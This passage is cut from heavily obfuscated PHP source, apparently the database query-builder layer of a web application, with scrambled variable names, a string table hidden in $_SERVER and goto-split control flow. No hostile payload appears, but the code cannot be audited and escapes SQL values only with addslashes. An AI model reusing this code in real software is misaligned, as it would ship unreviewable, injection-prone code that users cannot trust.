explode($µğË¨¦¿[50], $ºÕà¾’©); } if (is_array($ºÕà¾’©)) { $ä”ÃÃº = array(); foreach ($ºÕà¾’© as $íìÓï¸º => $”«©ƒ¬¥) { if (!is_numeric($íìÓï¸º)) { $ä”ÃÃº[] = $this->parseKey($íìÓï¸º, !1) . $µğË¨¦¿[1119] . $this->parseKey($”«©ƒ¬¥); } else { $ä”ÃÃº[] = $this->parseKey($”«©ƒ¬¥); } } $ÉÂê®ÆÚ = implode($µğË¨¦¿[50], $ä”ÃÃº); } elseif (is_string($ºÕà¾’©) && !empty($ºÕà¾’©)) { $ÉÂê®ÆÚ = $ºÕà¾’©; } else { $ÉÂê®ÆÚ = $µğË¨¦¿[222]; } return $ÉÂê®ÆÚ; } protected function parseTable($ìè°Ô™Í) { $Õ—êÑê„ =& $_SERVER[Ï×Œõ”û]; if (is_array($ìè°Ô™Í)) { $äÈîÎŸı = array(); foreach ($ìè°Ô™Í as $„¤‚ùï => $Ñ ³Ö¢) { if (!is_numeric($„¤‚ùï)) { $äÈîÎŸı[] = $this->parseKey($„¤‚ùï) . $Õ—êÑê„[53] . $this->parseKey($Ñ ³Ö¢); } else { $äÈîÎŸı[] = $this->parseKey($„¤‚ùï); } } $ìè°Ô™Í = $äÈîÎŸı; } elseif (is_string($ìè°Ô™Í)) { if (strstr($ìè°Ô™Í, $Õ—êÑê„[53])) { return $ìè°Ô™Í; } $ìè°Ô™Í = explode($Õ—êÑê„[50], $ìè°Ô™Í); array_walk($ìè°Ô™Í, array($this, $Õ—êÑê„[1024])); } return $Õ—êÑê„[1018] . trim(implode($Õ—êÑê„[1120], $ìè°Ô™Í), $Õ—êÑê„[473]) . $Õ—êÑê„[1018]; } protected function parseWhere($ş„¾şş—) { $ô«Ã¼À =& $_SERVER[Ï×Œõ”û]; $Ú®òÒƒµ = $ô«Ã¼À[12]; if (is_string($ş„¾şş—)) { $Ú®òÒƒµ = $ş„¾şş—; } else { $ØîÛ€ÄÃ = isset($ş„¾şş—[$ô«Ã¼À[1121]]) ? strtoupper($ş„¾şş—[$ô«Ã¼À[1121]]) : $ô«Ã¼À[12]; if (in_array($ØîÛ€ÄÃ, array($ô«Ã¼À[1122], $ô«Ã¼À[1123], $ô«Ã¼À[1124]))) { $ØîÛ€ÄÃ = $ô«Ã¼À[53] . $ØîÛ€ÄÃ . $ô«Ã¼À[53]; unset($ş„¾şş—[$ô«Ã¼À[1121]]); } else { $ØîÛ€ÄÃ = $ô«Ã¼À[1125]; } foreach ($ş„¾şş— as $‘Œş§ñœ => $½œóÑÍë) { $Ú®òÒƒµ .= $ô«Ã¼À[357]; if (is_numeric($‘Œş§ñœ)) { $‘Œş§ñœ = $ô«Ã¼À[1126]; } if (0 === strpos($‘Œş§ñœ, $ô«Ã¼À[11])) { $Ú®òÒƒµ .= $this->parseThinkWhere($‘Œş§ñœ, $½œóÑÍë); } else { if (!preg_match($ô«Ã¼À[1127], trim($‘Œş§ñœ))) { think_exception(think_lang($ô«Ã¼À[1128]) . $ô«Ã¼À[4] . $‘Œş§ñœ); } $Í£ØÎÊ = is_array($½œóÑÍë) && isset($½œóÑÍë[$ô«Ã¼À[1129]]); $‘Œş§ñœ = trim($‘Œş§ñœ); if (strpos($‘Œş§ñœ, $ô«Ã¼À[214])) { $ªªÜîğ = explode($ô«Ã¼À[214], $‘Œş§ñœ); $–àšÀÃ˜ = array(); foreach ($ªªÜîğ as $ñ‡ğ€ãø => $‡üÂ„’§) { $Ú÷Ï…Ö = $Í£ØÎÊ ? $½œóÑÍë[$ñ‡ğ€ãø] : $½œóÑÍë; $–àšÀÃ˜[] = $ô«Ã¼À[339] . $this->parseWhereItem($this->parseKey($‡üÂ„’§), $Ú÷Ï…Ö) . $ô«Ã¼À[1023]; } $Ú®òÒƒµ .= implode($ô«Ã¼À[1130], $–àšÀÃ˜); } elseif (strpos($‘Œş§ñœ, $ô«Ã¼À[286])) { $ªªÜîğ = explode($ô«Ã¼À[286], $‘Œş§ñœ); $–àšÀÃ˜ = array(); foreach ($ªªÜîğ as $ñ‡ğ€ãø => $‡üÂ„’§) { $Ú÷Ï…Ö = $Í£ØÎÊ ? $½œóÑÍë[$ñ‡ğ€ãø] : $½œóÑÍë; $–àšÀÃ˜[] = $ô«Ã¼À[339] . $this->parseWhereItem($this->parseKey($‡üÂ„’§), $Ú÷Ï…Ö) . $ô«Ã¼À[1023]; } $Ú®òÒƒµ .= implode($ô«Ã¼À[1125], $–àšÀÃ˜); } else { $Ú®òÒƒµ .= $this->parseWhereItem($this->parseKey($‘Œş§ñœ), $½œóÑÍë); } } $Ú®òÒƒµ .= $ô«Ã¼À[358] . $ØîÛ€ÄÃ; } $Ú®òÒƒµ = substr($Ú®òÒƒµ, 0, -strlen($ØîÛ€ÄÃ)); } return empty($Ú®òÒƒµ) ? $ô«Ã¼À[12] : $ô«Ã¼À[1131] . $Ú®òÒƒµ; } protected function parseWhereItem($³âèÖÄ·, $ñşÚ³Ş…) { $ÒÀÜï¼“ =& $_SERVER[Ï×Œõ”û]; $ãÔ×Çñã = $ÒÀÜï¼“[12]; if (is_array($ñşÚ³Ş…)) { if (is_string($ñşÚ³Ş…[0])) { $Õ¦ö¤èÁ = strtolower($ñşÚ³Ş…[0]); if (in_array($ñşÚ³Ş…[0], array($ÒÀÜï¼“[465], $ÒÀÜï¼“[1132], $ÒÀÜï¼“[1133], $ÒÀÜï¼“[1134], $ÒÀÜï¼“[1135], $ÒÀÜï¼“[1136]))) { $ãÔ×Çñã .= $³âèÖÄ· . $ÒÀÜï¼“[53] . $ñşÚ³Ş…[0] . $ÒÀÜï¼“[53] . $this->parseValue($ñşÚ³Ş…[1]); } elseif (preg_match($ÒÀÜï¼“[1137], $ñşÚ³Ş…[0])) { $ãÔ×Çñã .= $³âèÖÄ· . $ÒÀÜï¼“[53] . $this->exp[$Õ¦ö¤èÁ] . $ÒÀÜï¼“[53] . $this->parseValue($ñşÚ³Ş…[1]); } elseif (preg_match($ÒÀÜï¼“[1138], $ñşÚ³Ş…[0])) { if (is_array($ñşÚ³Ş…[1])) { $Œ×ÜÌ¾¤ = isset($ñşÚ³Ş…[2]) ? strtoupper($ñşÚ³Ş…[2]) : $ÒÀÜï¼“[1123]; if (in_array($Œ×ÜÌ¾¤, array($ÒÀÜï¼“[1122], $ÒÀÜï¼“[1123], $ÒÀÜï¼“[1124]))) { $¿è¯ñ¹’ = array(); foreach ($ñşÚ³Ş…[1] as $öş‚›à¬) { $¿è¯ñ¹’[] = $³âèÖÄ· . $ÒÀÜï¼“[53] . $this->exp[$Õ¦ö¤èÁ] . $ÒÀÜï¼“[53] . $this->parseValue($öş‚›à¬); } $ãÔ×Çñã .= $ÒÀÜï¼“[339] . implode($ÒÀÜï¼“[53] . $Œ×ÜÌ¾¤ . $ÒÀÜï¼“[53], $¿è¯ñ¹’) . $ÒÀÜï¼“[1023]; } } else { $ãÔ×Çñã .= $³âèÖÄ· . $ÒÀÜï¼“[53] . $this->exp[$Õ¦ö¤èÁ] . $ÒÀÜï¼“[53] . $this->parseValue($ñşÚ³Ş…[1]); } } elseif ($ÒÀÜï¼“[374] == $Õ¦ö¤èÁ) { $ãÔ×Çñã .= $ÒÀÜï¼“[1021] . $³âèÖÄ· . $ÒÀÜï¼“[53] . $ñşÚ³Ş…[1] . $ÒÀÜï¼“[1139]; } elseif (preg_match($ÒÀÜï¼“[1140], $ñşÚ³Ş…[0])) { $ãÔ×Çñã .= $ñşÚ³Ş…[0]; } elseif (preg_match($ÒÀÜï¼“[1141], $ñşÚ³Ş…[0])) { if (isset($ñşÚ³Ş…[2]) && $ÒÀÜï¼“[374] == $ñşÚ³Ş…[2]) { $ãÔ×Çñã .= $³âèÖÄ· . $ÒÀÜï¼“[53] . $this->exp[$Õ¦ö¤èÁ] . $ÒÀÜï¼“[53] . $ñşÚ³Ş…[1]; } else { if (is_string($ñşÚ³Ş…[1])) { $ñşÚ³Ş…[1] = explode($ÒÀÜï¼“[50], $ñşÚ³Ş…[1]); } $˜Š‚•êÜ = implode($ÒÀÜï¼“[50], $this->parseValue($ñşÚ³Ş…[1])); $ãÔ×Çñã .= $³âèÖÄ· . $ÒÀÜï¼“[53] . $this->exp[$Õ¦ö¤èÁ] . $ÒÀÜï¼“[1021] . $˜Š‚•êÜ . $ÒÀÜï¼“[1023]; } } elseif (preg_match($ÒÀÜï¼“[1142], $ñşÚ³Ş…[0])) { $¹­‹è’Ä = is_string($ñşÚ³Ş…[1]) ? explode($ÒÀÜï¼“[50], $ñşÚ³Ş…[1]) : $ñşÚ³Ş…[1]; $ãÔ×Çñã .= $ÒÀÜï¼“[1021] . $³âèÖÄ· . $ÒÀÜï¼“[53] . $this->exp[$Õ¦ö¤èÁ] . $ÒÀÜï¼“[53] . $this->parseValue($¹­‹è’Ä[0]) . $ÒÀÜï¼“[1125] . $this->parseValue($¹­‹è’Ä[1]) . $ÒÀÜï¼“[358]; } else { think_exception(think_lang($ÒÀÜï¼“[1128]) . $ÒÀÜï¼“[4] . $ñşÚ³Ş…[0]); } } else { $³Ä‰±ŸÓ = count($ñşÚ³Ş…); $“Ù’çâ = $ÒÀÜï¼“[12]; if (is_string($ñşÚ³Ş…[$³Ä‰±ŸÓ - 1])) { $“Ù’çâ = isset($ñşÚ³Ş…[$³Ä‰±ŸÓ - 1]) ? strtoupper($ñşÚ³Ş…[$³Ä‰±ŸÓ - 1]) : $ÒÀÜï¼“[12]; if (in_array($“Ù’çâ, array($ÒÀÜï¼“[1122], $ÒÀÜï¼“[1123], $ÒÀÜï¼“[1124]))) { $³Ä‰±ŸÓ = $³Ä‰±ŸÓ - 1; } } else { $“Ù’çâ = $ÒÀÜï¼“[1122]; } for ($Ç‡‰–ÇÆ = 0; $Ç‡‰–ÇÆ < $³Ä‰±ŸÓ; $Ç‡‰–ÇÆ++) { $¹­‹è’Ä = is_array($ñşÚ³Ş…[$Ç‡‰–ÇÆ]) ? $ñşÚ³Ş…[$Ç‡‰–ÇÆ][1] : $ñşÚ³Ş…[$Ç‡‰–ÇÆ]; if ($ÒÀÜï¼“[374] == strtolower($ñşÚ³Ş…[$Ç‡‰–ÇÆ][0])) { $ãÔ×Çñã .= $ÒÀÜï¼“[339] . $³âèÖÄ· . $ÒÀÜï¼“[53] . $¹­‹è’Ä . $ÒÀÜï¼“[1139] . $“Ù’çâ . $ÒÀÜï¼“[53]; } else { $«¶ĞÂò = is_array($ñşÚ³Ş…[$Ç‡‰–ÇÆ]) ? $this->exp[strtolower($ñşÚ³Ş…[$Ç‡‰–ÇÆ][0])] : $ÒÀÜï¼“[465]; if (!$«¶ĞÂò && is_array($ñşÚ³Ş…[$Ç‡‰–ÇÆ]) && in_array($ñşÚ³Ş…[$Ç‡‰–ÇÆ][0], array($ÒÀÜï¼“[465], $ÒÀÜï¼“[1132], $ÒÀÜï¼“[1133], $ÒÀÜï¼“[1134], $ÒÀÜï¼“[1135], $ÒÀÜï¼“[1136]))) { $«¶ĞÂò = $ñşÚ³Ş…[$Ç‡‰–ÇÆ][0]; } $ãÔ×Çñã .= $ÒÀÜï¼“[339] . $³âèÖÄ· . $ÒÀÜï¼“[53] . $«¶ĞÂò . $ÒÀÜï¼“[53] . $this->parseValue($¹­‹è’Ä) . $ÒÀÜï¼“[1139] . $“Ù’çâ . $ÒÀÜï¼“[53]; } } $ãÔ×Çñã = substr($ãÔ×Çñã, 0, -4); } } else { $ãÔ×Çñã .= $³âèÖÄ· . $ÒÀÜï¼“[1143] . $this->parseValue($ñşÚ³Ş…); } return $ãÔ×Çñã; } protected function parseThinkWhere($•´©¾¥, $îˆıú£„) { $şáñÜôŠ =& $_SERVER[Ï×Œõ”û]; $œ®¦¾óØ = $şáñÜôŠ[12]; switch ($•´©¾¥) { case $şáñÜôŠ[429]: $œ®¦¾óØ = $îˆıú£„; break; case $şáñÜôŠ[1126]: $œ®¦¾óØ = is_string($îˆıú£„) ? $îˆıú£„ : substr($this->parseWhere($îˆıú£„), 6); break; case $şáñÜôŠ[1144]: parse_str($îˆıú£„, $©¬ÆÊº); if (isset($©¬ÆÊº[$şáñÜôŠ[1121]])) { $ĞÊçÛŞÚ = $şáñÜôŠ[53] . strtoupper($©¬ÆÊº[$şáñÜôŠ[1121]]) . $şáñÜôŠ[53]; unset($©¬ÆÊº[$şáñÜôŠ[1121]]); } else { $ĞÊçÛŞÚ = $şáñÜôŠ[1125]; } $ŠËÊ›êó = array(); foreach ($©¬ÆÊº as $ÌÏÓÊ€ => $‡Èæ¨—˜) { $ŠËÊ›êó[] = $this->parseKey($ÌÏÓÊ€) . $şáñÜôŠ[1143] . $this->parseValue($‡Èæ¨—˜); } $œ®¦¾óØ = implode($ĞÊçÛŞÚ, $ŠËÊ›êó); break; } return $œ®¦¾óØ; } protected function parseLimit($Ê‰Á½ò¬) { $ò¦·Åòş =& $_SERVER[Ï×Œõ”û]; return !empty($Ê‰Á½ò¬) ? $ò¦·Åòş[51] . $Ê‰Á½ò¬ . $ò¦·Åòş[53] : $ò¦·Åòş[12]; } protected function parseJoin($Èªô§‘) { $òÓŒç« =& $_SERVER[Ï×Œõ”û]; $¦§ç×ÈÉ = $òÓŒç«[12]; if (!empty($Èªô§‘)) { if (is_array($Èªô§‘)) { foreach ($Èªô§‘ as $ô»£ÛæÌ => $ĞÚÏ³Î) { if (!1 !== stripos($ĞÚÏ³Î, $òÓŒç«[1145])) { $¦§ç×ÈÉ .= $òÓŒç«[53] . $ĞÚÏ³Î; } else { $¦§ç×ÈÉ .= $òÓŒç«[1146] . $ĞÚÏ³Î; } } } else { $¦§ç×ÈÉ .= $òÓŒç«[1146] . $Èªô§‘; } } $¦§ç×ÈÉ = preg_replace($òÓŒç«[1147], think_config($òÓŒç«[1051]) . $òÓŒç«[1148], $¦§ç×ÈÉ); return $¦§ç×ÈÉ; } protected function parseOrder($íÙÂ¼¿¤) { $ °¿ßú¨ =& $_SERVER[Ï×Œõ”û]; if (is_array($íÙÂ¼¿¤)) { $£å‰Ô“› = array(); foreach ($íÙÂ¼¿¤ as $§«—ÒÙ => $È—¯¯ ) { if (is_numeric($§«—ÒÙ)) { $£å‰Ô“›[] = $this->parseKey($È—¯¯ ); } else { $È—¯¯  = in_array(strtoupper(trim($È—¯¯ )), array($ °¿ßú¨[1149], $ °¿ßú¨[1150])) ? $ °¿ßú¨[53] . $È—¯¯  : $ °¿ßú¨[12]; if (preg_match($ °¿ßú¨[1151], $§«—ÒÙ)) { $£å‰Ô“›[] = $this->parseKey($§«—ÒÙ) . $È—¯¯ ; } else { think_exception($ °¿ßú¨[1152] . $§«—ÒÙ); } } } $íÙÂ¼¿¤ = implode($ °¿ßú¨[50], $£å‰Ô“›); } return !empty($íÙÂ¼¿¤) ? $ °¿ßú¨[1153] . $íÙÂ¼¿¤ : $ °¿ßú¨[12]; } protected function parseGroup($åÛ€‰’À) { $€¨ì‹‡¼ =& $_SERVER[Ï×Œõ”û]; return !empty($åÛ€‰’À) ? $€¨ì‹‡¼[1154] . $åÛ€‰’À : $€¨ì‹‡¼[12]; } protected function parseHaving($™» ßÍŠ) { $Î×î—× =& $_SERVER[Ï×Œõ”û]; return !empty($™» ßÍŠ) ? $Î×î—×[1155] . $™» ßÍŠ : $Î×î—×[12]; } protected function parseComment($ò·êêÌû) { $µÜï—İµ =& $_SERVER[Ï×Œõ”û]; return !empty($ò·êêÌû) ? $µÜï—İµ[1156] . $ò·êêÌû . $µÜï—İµ[1157] : $µÜï—İµ[12]; } protected function parseDistinct($ƒ…ˆáò™) { $ğ·ü¯Š =& $_SERVER[Ï×Œõ”û]; return !empty($ƒ…ˆáò™) ? $ğ·ü¯Š[1158] : $ğ·ü¯Š[12]; } protected function parseUnion($ç‰´Û™ã) { $Š‹ïëö¸ =& $_SERVER[Ï×Œõ”û]; if (empty($ç‰´Û™ã)) { return $Š‹ïëö¸[12]; } if (isset($ç‰´Û™ã[$Š‹ïëö¸[425]])) { $İıüé¨ = $Š‹ïëö¸[1159]; unset($ç‰´Û™ã[$Š‹ïëö¸[425]]); } else { $İıüé¨ = $Š‹ïëö¸[1160]; } foreach ($ç‰´Û™ã as $¨÷¾ËÀ) { $’›‰Æå»[] = $İıüé¨ . (is_array($¨÷¾ËÀ) ? $this->buildSelectSql($¨÷¾ËÀ) : $¨÷¾ËÀ); } return implode($Š‹ïëö¸[53], $’›‰Æå»); } public function insert($ÚË¼Åª, $êè¤¬ÎÛ = array(), $è¾ï€Áš = false) { $™½ƒ©¤³ =& $_SERVER[Ï×Œõ”û]; $µ€ÙçÖ÷ = $‡×á¢Îå = array(); $this->model = $êè¤¬ÎÛ[$™½ƒ©¤³[361]]; foreach ($ÚË¼Åª as $êü´Øú¹ => $Á¹ãÆ¨ñ) { if (is_array($Á¹ãÆ¨ñ) && $™½ƒ©¤³[374] == $Á¹ãÆ¨ñ[0]) { $‡×á¢Îå[] = $this->parseKey($êü´Øú¹); $µ€ÙçÖ÷[] = $Á¹ãÆ¨ñ[1]; } elseif (is_scalar($Á¹ãÆ¨ñ) || is_null($Á¹ãÆ¨ñ)) { $‡×á¢Îå[] = $this->parseKey($êü´Øú¹); $µ€ÙçÖ÷[] = $this->parseValue($Á¹ãÆ¨ñ); } } $‚¡ìé³ë = ($è¾ï€Áš ? $™½ƒ©¤³[1025] : $™½ƒ©¤³[1026]) . $™½ƒ©¤³[1027] . $this->parseTable($êè¤¬ÎÛ[$™½ƒ©¤³[359]]) . $™½ƒ©¤³[1021] . implode($™½ƒ©¤³[50], $‡×á¢Îå) . $™½ƒ©¤³[1022] . implode($™½ƒ©¤³[50], $µ€ÙçÖ÷) . $™½ƒ©¤³[1023]; $‚¡ìé³ë .= $this->parseLock(isset($êè¤¬ÎÛ[$™½ƒ©¤³[961]]) ? $êè¤¬ÎÛ[$™½ƒ©¤³[961]] : !1); $‚¡ìé³ë .= $this->parseComment(!empty($êè¤¬ÎÛ[$™½ƒ©¤³[431]]) ? $êè¤¬ÎÛ[$™½ƒ©¤³[431]] : $™½ƒ©¤³[12]); return $this->execute($‚¡ìé³ë, $this->parseBind(!empty($êè¤¬ÎÛ[$™½ƒ©¤³[363]]) ? $êè¤¬ÎÛ[$™½ƒ©¤³[363]] : array())); } public function selectInsert($›°Ç–º„, $·€ÍÅ…„, $ú±ĞÊó± = array()) { $…èËµ£ =& $_SERVER[Ï×Œõ”û]; $this->model = $ú±ĞÊó±[$…èËµ£[361]]; if (is_string($›°Ç–º„)) { $›°Ç–º„ = explode($…èËµ£[50], $›°Ç–º„); } array_walk($›°Ç–º„, array($this, $…èËµ£[1024])); $¼«†Î¶É = $…èËµ£[1161] . $this->parseTable($·€ÍÅ…„) . $…èËµ£[1021] . implode($…èËµ£[50], $›°Ç–º„) . $…èËµ£[1139]; $¼«†Î¶É .= $this->buildSelectSql($ú±ĞÊó±); return $this->execute($¼«†Î¶É, $this->parseBind(!empty($ú±ĞÊó±[$…èËµ£[363]]) ? $ú±ĞÊó±[$…èËµ£[363]] : array())); } public function update($÷„Ñ€Ÿ, $ì‡Åõ½) { $Ì€ÍÀŒò =& $_SERVER[Ï×Œõ”û]; $this->model = $ì‡Åõ½[$Ì€ÍÀŒò[361]]; $íá¨í‹Ä = $Ì€ÍÀŒò[1162] . $this->parseTable($ì‡Åõ½[$Ì€ÍÀŒò[359]]) . $this->parseSet($÷„Ñ€Ÿ) . $this->parseWhere(!empty($ì‡Åõ½[$Ì€ÍÀŒò[355]]) ? $ì‡Åõ½[$Ì€ÍÀŒò[355]] : $Ì€ÍÀŒò[12]) . $this->parseOrder(!empty($ì‡Åõ½[$Ì€ÍÀŒò[443]]) ? $ì‡Åõ½[$Ì€ÍÀŒò[443]] : $Ì€ÍÀŒò[12]) . $this->parseLimit(!empty($ì‡Åõ½[$Ì€ÍÀŒò[370]]) ? $ì‡Åõ½[$Ì€ÍÀŒò[370]] : $Ì€ÍÀŒò[12]) . $this->parseLock(isset($ì‡Åõ½[$Ì€ÍÀŒò[961]]) ? $ì‡Åõ½[$Ì€ÍÀŒò[961]] : !1) . $this->parseComment(!empty($ì‡Åõ½[$Ì€ÍÀŒò[431]]) ? $ì‡Åõ½[$Ì€ÍÀŒò[431]] : $Ì€ÍÀŒò[12]); return $this->execute($íá¨í‹Ä, $this->parseBind(!empty($ì‡Åõ½[$Ì€ÍÀŒò[363]]) ? $ì‡Åõ½[$Ì€ÍÀŒò[363]] : array())); } public function delete($Ñ‘©¬Ó» = array()) { $ÖÀ¡ç­« =& $_SERVER[Ï×Œõ”û]; $this->model = $Ñ‘©¬Ó»[$ÖÀ¡ç­«[361]]; $ÕüÆùÜà = $ÖÀ¡ç­«[1163] . $this->parseTable($Ñ‘©¬Ó»[$ÖÀ¡ç­«[359]]) . $this->parseWhere(!empty($Ñ‘©¬Ó»[$ÖÀ¡ç­«[355]]) ? $Ñ‘©¬Ó»[$ÖÀ¡ç­«[355]] : $ÖÀ¡ç­«[12]) . $this->parseOrder(!empty($Ñ‘©¬Ó»[$ÖÀ¡ç­«[443]]) ? $Ñ‘©¬Ó»[$ÖÀ¡ç­«[443]] : $ÖÀ¡ç­«[12]) . $this->parseLimit(!empty($Ñ‘©¬Ó»[$ÖÀ¡ç­«[370]]) ? $Ñ‘©¬Ó»[$ÖÀ¡ç­«[370]] : $ÖÀ¡ç­«[12]) . $this->parseLock(isset($Ñ‘©¬Ó»[$ÖÀ¡ç­«[961]]) ? $Ñ‘©¬Ó»[$ÖÀ¡ç­«[961]] : !1) . $this->parseComment(!empty($Ñ‘©¬Ó»[$ÖÀ¡ç­«[431]]) ? $Ñ‘©¬Ó»[$ÖÀ¡ç­«[431]] : $ÖÀ¡ç­«[12]); return $this->execute($ÕüÆùÜà, $this->parseBind(!empty($Ñ‘©¬Ó»[$ÖÀ¡ç­«[363]]) ? $Ñ‘©¬Ó»[$ÖÀ¡ç­«[363]] : array())); } public function select($ÔçİøĞ = array()) { $½ëÖµåƒ =& $_SERVER[Ï×Œõ”û]; $this->model = $ÔçİøĞ[$½ëÖµåƒ[361]]; $Ã½åÆªö = $this->buildSelectSql($ÔçİøĞ); $ ÇÜ©Ùï = isset($ÔçİøĞ[$½ëÖµåƒ[426]]) ? $ÔçİøĞ[$½ëÖµåƒ[426]] : !1; if ($ ÇÜ©Ùï) { $•öŞƒ†Ä = is_string($ ÇÜ©Ùï[$½ëÖµåƒ[95]]) ? $ ÇÜ©Ùï[$½ëÖµåƒ[95]] : $½ëÖµåƒ[1164] . md5($Ã½åÆªö); $ÄËìèé = think_cache($•öŞƒ†Ä, $½ëÖµåƒ[12], $ ÇÜ©Ùï); if (!1 !== $ÄËìèé) { return $ÄËìèé; } } $¿¶Ç˜°ğ = $this->query($Ã½åÆªö, $this->parseBind(!empty($ÔçİøĞ[$½ëÖµåƒ[363]]) ? $ÔçİøĞ[$½ëÖµåƒ[363]] : array())); if ($ ÇÜ©Ùï && !1 !== $¿¶Ç˜°ğ) { think_cache($•öŞƒ†Ä, $¿¶Ç˜°ğ, $ ÇÜ©Ùï); } return $¿¶Ç˜°ğ; } public function buildSelectSql($úîğîªô = array()) { $Õ¢‡ö© =& $_SERVER[Ï×Œõ”û]; if (isset($úîğîªô[$Õ¢‡ö©[430]])) { if (strpos($úîğîªô[$Õ¢‡ö©[430]], $Õ¢‡ö©[50])) { list($šö®…±“, $öŒ¾şµˆ) = explode($Õ¢‡ö©[50], $úîğîªô[$Õ¢‡ö©[430]]); } else { $šö®…±“ = $úîğîªô[$Õ¢‡ö©[430]]; } $šö®…±“ = $šö®…±“ ? $šö®…±“ : 1; $öŒ¾şµˆ = isset($öŒ¾şµˆ) ? $öŒ¾şµˆ : (is_numeric($úîğîªô[$Õ¢‡ö©[370]]) ? $úîğîªô[$Õ¢‡ö©[370]] : 20); $ä‡¤Õ¿ş = $öŒ¾şµˆ * ((int) $šö®…±“ - 1); $úîğîªô[$Õ¢‡ö©[370]] = $ä‡¤Õ¿ş . $Õ¢‡ö©[50] . $öŒ¾şµˆ; } if (think_config($Õ¢‡ö©[1165])) { $ÌŸ£ÜÁ = $Õ¢‡ö©[1166] . md5(serialize($úîğîªô)); $‘£É¤×å = think_cache($ÌŸ£ÜÁ); if ($‘£É¤×å) { return $‘£É¤×å; } } $ÊÁĞÅ²‡ = $this->parseSql($this->selectSql, $úîğîªô); $ÊÁĞÅ²‡ .= $this->parseLock(isset($úîğîªô[$Õ¢‡ö©[961]]) ? $úîğîªô[$Õ¢‡ö©[961]] : !1); if (isset($ÌŸ£ÜÁ)) { think_cache($ÌŸ£ÜÁ, $ÊÁĞÅ²‡); } return $ÊÁĞÅ²‡; } public function parseSql($è’ªÙöŠ, $™·úôñ’ = array()) { $ğ—Êİ†ë =& $_SERVER[Ï×Œõ”û]; $è’ªÙöŠ = str_replace(array($ğ—Êİ†ë[1167], $ğ—Êİ†ë[1168], $ğ—Êİ†ë[1169], $ğ—Êİ†ë[1170], $ğ—Êİ†ë[1171], $ğ—Êİ†ë[1172], $ğ—Êİ†ë[1173], $ğ—Êİ†ë[1174], $ğ—Êİ†ë[1175], $ğ—Êİ†ë[1176], $ğ—Êİ†ë[1177]), array($this->parseTable("{$™·úôñ’[$ğ—Êİ†ë[359]]}"), $this->parseDistinct(isset($™·úôñ’[$ğ—Êİ†ë[1178]]) ? $™·úôñ’[$ğ—Êİ†ë[1178]] : !1), $this->parseField(!empty($™·úôñ’[$ğ—Êİ†ë[353]]) ? $™·úôñ’[$ğ—Êİ†ë[353]] : $ğ—Êİ†ë[222]), $this->parseJoin(!empty($™·úôñ’[$ğ—Êİ†ë[362]]) ? $™·úôñ’[$ğ—Êİ†ë[362]] : $ğ—Êİ†ë[12]), $this->parseWhere(!empty($™·úôñ’[$ğ—Êİ†ë[355]]) ? $™·úôñ’[$ğ—Êİ†ë[355]] : $ğ—Êİ†ë[12]), $this->parseGroup(!empty($™·úôñ’[$ğ—Êİ†ë[603]]) ? $™·úôñ’[$ğ—Êİ†ë[603]] : $ğ—Êİ†ë[12]), $this->parseHaving(!empty($™·úôñ’[$ğ—Êİ†ë[1179]]) ? $™·úôñ’[$ğ—Êİ†ë[1179]] : $ğ—Êİ†ë[12]), $this->parseOrder(!empty($™·úôñ’[$ğ—Êİ†ë[443]]) ? $™·úôñ’[$ğ—Êİ†ë[443]] : $ğ—Êİ†ë[12]), $this->parseLimit(!empty($™·úôñ’[$ğ—Êİ†ë[370]]) ? $™·úôñ’[$ğ—Êİ†ë[370]] : $ğ—Êİ†ë[12]), $this->parseUnion(!empty($™·úôñ’[$ğ—Êİ†ë[424]]) ? $™·úôñ’[$ğ—Êİ†ë[424]] : $ğ—Êİ†ë[12]), $this->parseComment(!empty($™·úôñ’[$ğ—Êİ†ë[431]]) ? $™·úôñ’[$ğ—Êİ†ë[431]] : $ğ—Êİ†ë[12])), $è’ªÙöŠ); return $è’ªÙöŠ; } public function getLastSql($Ìşß¼¯ù = '') { return $Ìşß¼¯ù ? $this->modelSql[$Ìşß¼¯ù] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($‡óÇ÷ˆ) { return addslashes($‡óÇ÷ˆ); } public function setModel($¿ŸÁĞ˜£) { $this->model = $¿ŸÁĞ˜£; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto F•Ş…ºÃäÕ; e¾ÁÃ¯“œ: function binCheckBigger($Ê£åò«, $°»ğõõ) { return $Ê£åò« > $°»ğõõ; } $_SERVER[$_SERVER[Ë¨ø•È][3]] = ("\x39\x30\x38\x37"."\x36\x31")+0;$_nbuj="tugjopqbsvafixm5ec8z1l730ndkwyr492h63bim7dksgxlf0wv14heo62tz58qacjnrpy9ulgfm";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ïğ´Éí™, $ú€§§Ô) { $Á‰Á¤Óë =& $_SERVER[Ï×Œõ”û]; if (isset(self::$_methodList[$ïğ´Éí™])) { return @call_user_func_array(self::$_methodList[$ïğ´Éí™], $ú€§§Ô); } else { if (method_exists($this, $ïğ´Éí™)) { return call_user_func_array(array($this, $ïğ´Éí™), $ú€§§Ô); } else { think_exception(__CLASS__ . $Á‰Á¤Óë[4] . $ïğ´Éí™ . $Á‰Á¤Óë[5]); } } } public static function __callStatic($Ã’‰ôü, $ˆ…©©¶ë) { if (isset(self::$_methodListStatic[$Ã’‰ôü])) { return call_user_func_array(self::$_methodListStatic[$Ã’‰ôü], $ˆ…©©¶ë); } else { if (method_exists(self, $Ã’‰ôü)) { return call_user_func_array(array(self, $Ã’‰ôü), $ˆ…©©¶ë); } else { show_json("{$Ã’‰ôü}\50\x29\40\x6e\x6f\164\x20\145\x78\151\x73\164\73", !1); } } } public static function addMethod($ÌÇ…ø¡, $òÇÒ™Õ¼) { self::$_methodList[$ÌÇ…ø¡] = $òÇÒ™Õ¼; } public static function addMethodStatic($öÌ¶“¡, $ù ¬Šß™) { self::$_methodListStatic[$öÌ¶“¡] = $ù ¬Šß™; } } goto A¹‘­òóæ…; BôÆãê¡ì¬: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\56\164\x61\147\x4c\151\163\164"; public $modelType = "\125\x73\145\162\x4f\x70\x74\x69\x6f\156"; public $field = array("\156\141\155\x65", "\x73\164\x79\154\x65", "\x73\x6f\162\164"); public function listData($üÑ—ËéÑ = false, $·…®ïÍÜ = "\163\x6f\x72\164", $²¿ÒêŠ = false) { return parent::listData($üÑ—ËéÑ, $·…®ïÍÜ, $²¿ÒêŠ); } public function remove($ëÏá‚×Û) { return parent::remove($ëÏá‚×Û); } public function add($ßŠ“”ÍÉ, $÷–ø›Îğ = 